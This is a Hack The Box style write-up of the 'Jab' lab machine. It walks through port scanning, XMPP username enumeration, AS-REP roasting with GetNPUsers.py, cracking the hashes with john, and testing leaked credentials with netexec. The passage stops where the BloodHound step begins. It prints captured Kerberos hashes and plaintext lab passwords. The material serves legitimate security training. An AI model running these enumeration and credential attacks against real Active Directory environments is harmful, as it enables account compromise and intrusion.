---
layout: writeup
category: HTB
description: Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator.
points: 30
solves: 2439
tags: xmpp xmpp-user-enumeration asreproast hash-cracking executedcom dcomexec.py openfire-rce CVE-2023-32315
date: 2024-06-28
title: HTB Jab writeup
comments: true
---

Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator.

# Enumeration

## Port scanning

We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.4
# Nmap 7.94SVN scan initiated Mon Apr 15 19:00:27 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.4
Nmap scan report for 10.10.11.4
Host is up (0.10s latency).
Not shown: 65498 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-04-15 17:00:47Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
|_ssl-date: 2024-04-15T17:02:07+00:00; -3s from scanner time.
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
5222/tcp  open  jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     compression_methods: 
|     stream_id: 7tjrw5lhj8
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    capabilities: 
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    compression_methods: 
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     compression_methods: 
|     stream_id: 7qolyzbuux
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    capabilities: 
5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    compression_methods: 
|_ssl-date: TLS randomness does not represent time
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     compression_methods: 
|     stream_id: 5v9llxxh7r
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    capabilities: 
5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     unknown: 
|     capabilities: 
|     xmpp: 
|     auth_mechanisms: 
|     errors: 
|       (timeout)
|_    compression_methods: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 15 Apr 2024 17:00:47 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 15 Apr 2024 17:00:52 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 15 Apr 2024 17:00:59 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 15 Apr 2024 17:01:05 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
9999/tcp  open  nagios-nsca         Nagios NSCA
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49673/tcp open  msrpc               Microsoft Windows RPC
49690/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc               Microsoft Windows RPC
49694/tcp open  msrpc               Microsoft Windows RPC
49701/tcp open  msrpc               Microsoft Windows RPC
49716/tcp open  msrpc               Microsoft Windows RPC
49775/tcp open  msrpc               Microsoft Windows RPC
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.94SVN%I=7%D=4/15%Time=661D5D55%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
SF:g/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
SF:eams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=4/15%Time=661D5D41%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x
SF:202024\x2017:00:47\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20202
SF:2\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x2
SF:0bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Op
SF:enfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><fon
SF:t\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://ww
SF:w\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service
SF:</b></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20U
SF:nknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x202024\x2017:00:
SF:52\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"H
SF:TTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:
SF:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\
SF:x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1
SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
SF:er\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Il
SF:legal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x
SF:0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</
SF:pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20
SF:CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-L
SF:ength:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</
SF:h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=4/15%Time=661D5D4D%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x2
SF:0Apr\x202024\x2017:00:59\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\
SF:x202022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Rang
SF:es:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><ti
SF:tle>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<bod
SF:y><font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"htt
SF:p://www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20S
SF:ervice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Mon,\x2015\x20Apr\x202024\x2017:01:05\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x205
SF:05\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-15T17:02:00
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 15 19:02:15 2024 -- 1 IP address (1 host up) scanned in 107.72 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

It's possible to see that there are configured the domains jab.htb and dc01.jab.htb, so we need to add this line to `/etc/hosts` for the system to locate where they are:

```bash
10.10.11.4 jab.htb dc01.jab.htb 
```

Also, it's possible to see that we have active-directory-related ports,  which are: 
* 88, 464 for Kerberos
* 135 and 593 for RPC
* 139, 445 for SMB
* 389, 636, 3268, 3269 for LDAP
* 5989 for WinRM

Enumerating Active Directory doesn't allow us to do anything, but we also have some ports related to [XMPP messaging service](https://xmpp.org/) which are 5222, 5223, 5262, 5263, 5269, 5270, 5275, 5276, 7070, 7443, 7777.

# XMPP enumeration

Searching for XMPP pentesting, I found [this article](https://bishopfox.com/blog/xmpp-underappreciated-attack-surface) that talks about how we can enumerate usernames using [pidgin client](https://pidgin.im/install/). I will replicate it by running pidgin with `pidgin -d | tee xmpp_output.txt` (to enter in debug mode and see all information in a file for later filter users more easily), registering an account and going to `Accounts > [my created accounts@jab.htb] > search for users > search.jab.htb (as its suggested) > enter * for searching all usernames`. Now we can filter for all the usernames and retrieve them into a file by using this command:

```bash
❯ grep -Po '(?<=<field var="Username"><value>).*?(?=</value></field>)' xmpp_output.txt > users.txt
```

# Access as svc_openfire

Now that we have a comprehensive list of usernames, we can try making a ASRepRoast attack to retrieve a TGT hash for later cracking it offline. Doing this, we can see three users that retrieves hashes:

```bash
❯ GetNPUsers.py -no-pass -usersfile users.txt jab.htb/ -o asrep.hashes
<SNIP>
❯ cat asrep.hashes
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: asrep.hashes
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$jmontgomery@JAB.HTB:5eae5000d1ba1230b5d78b2f65924325$34d0461e31a87430d30eb11a8d5b41a64506d9f9c3e4ad43640f58995a066ab0d1a905aac71e903a043cc4126efacc22258e1de2304b
       │ 1e4f6c4eb9c4140cdef1a4e8951b39cb8c5dac97ed066f8b9558408f34e65905f8e6f6c82412c94f5adc4c3bdf2e9a65e58d5da22d9e729f8866f33c3478bee0ea44cdf92c6a69aba56384c72bbb2dfc3eeb133e4c54159
       │ c4948857f75617ee3578ab1cbdfd3dcbd509782a73e26758d66392d60267dcaf5b2fd6cd3c010f1a4f92294408dacbf84724b59125c87ec5d2077d55089b4d19d709f4fb3f23633be8372f8c784073ff11fdcd106
   2   │ $krb5asrep$23$lbradford@JAB.HTB:9400ff54a014aa27b01aeb33c577c783$818b612f71ab30653444208ce3ddf9edeed7f8120eecb3a007f1f1290f5d650254be985f9a1c1ef70125be84e24e076559737bf0673687
       │ 39425e917f469e27d9319ab2e48ac179c69354991767622bed2ffcd97c77e9ec21d74225b70985cac7f93d0de00b8ffd714d684a2e4bc74e0c6b869d9a7c087af354b45c41cf0eb44067786d89c39cf4bd908d318d78772
       │ ce4e3c50f58f287b9103bbfdcc65c870d38de1d009d525d7574bd1bef078993e72d94a51cb72bf2f5f12c3702b6b83f20ba9fe58d767c62c3bc0a347e70d6f28237bd80db05b5a66f2d3e1fd1fad673fc8ed6e6
   3   │ $krb5asrep$23$mlowe@JAB.HTB:2368c98d85fa02fb791c418b03bc4028$d866aa5e09c13aa57d8a1507085faccb3d589de266dbb82421084b3d31972c2e81e27b8a5b0bb89dda6e6b61344f40991582b3537f4d85497f
       │ 8f24e01c3d66b922ae37765328b96c5374bc022434624a6a6f83cd1864cd6d767b3500ef6511c7ce9e03a0cb46baae891bc1529194867119dbfb46d694b51d58c9fe45b98f20c24d9ec3ee10dbcc087e5e6a54d7b8d2552
       │ 6bf2ca01bdbd1b40931a30fc327aa01c2f39bb30a3bb2ce644a7f08af7a59083e2f4341537ada8e58bec47c5e8036b5694430939316eb567cacbff9e966170f8313ba782a1439c6f62b555820b6c3c01948
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Cracking it, it's possible to see that only user jmontgomery has a password inside rockyou.txt:

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt asrep.hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Midnight_121     ($krb5asrep$23$jmontgomery@JAB.HTB)     
1g 0:00:00:26 DONE (2024-06-28 21:56) 0.03831g/s 549569p/s 1513Kc/s 1513KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

With this password, I have tested and isn't possible to do anything interesting related to active directory. But we still have XMPP, and reusing this credential and looking at messages (going to Buddies > Join a chat > Room List and selecting jmontgomery account > Get List), we can see a chat called pentest2003 which leaks a password for svc_openfire because it was shared during a pentest:

![Leaked password of svc_openfire](/assets/images/Jab/leaked_password_for_svc_openfire.png)

But we still can't use winrm or have nothing interesting:

```bash
❯ netexec smb 10.10.11.4 -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' --shares
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
SMB         10.10.11.4      445    DC01             [*] Enumerated shares
SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
SMB         10.10.11.4      445    DC01             -----           -----------     ------
SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.4      445    DC01             C$                              Default share
SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.4      445    DC01             SYSVOL          READ            Logon server share
```
```bash
❯ netexec winrm 10.10.11.4 -u 'svc_openfire' -p '!@#$%^&*(1qazxsw'
WINRM       10.10.11.4      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:jab.htb)
WINRM       10.10.11.4      5985   DC01             [-] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
```

However, we can view users info using bloodhound since we have valid creds that work for LDAP. Using bloodhound-python to retrieve all info and uploading that zip file to bloodhound, we can see that svc_openfire has ExecuteDCOM privilege in jab.htb:

```bash
